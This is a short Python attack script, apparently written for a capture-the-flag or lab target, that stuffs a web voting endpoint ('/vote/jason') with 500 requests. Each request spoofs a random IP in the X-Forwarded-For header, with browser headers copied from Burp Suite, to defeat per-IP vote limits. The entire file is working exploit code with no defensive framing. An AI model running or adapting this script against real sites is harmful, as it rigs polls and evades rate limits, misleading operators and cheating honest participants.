import requests
import random
import socket
import struct

# Generates 500 unique IP addresses and submits in the 'X-Forwarded-For" parameter of the header.
# The header contents were retrieved from Burp Suite when navigating to the URL.
for i in range(500):
    
    ipaddr = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    url = "http://w210.network:8102/vote/jason"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", 
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", 
               "X-Forwarded-For": ipaddr, "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    requests.get(url, headers = headers)

print("Completed")
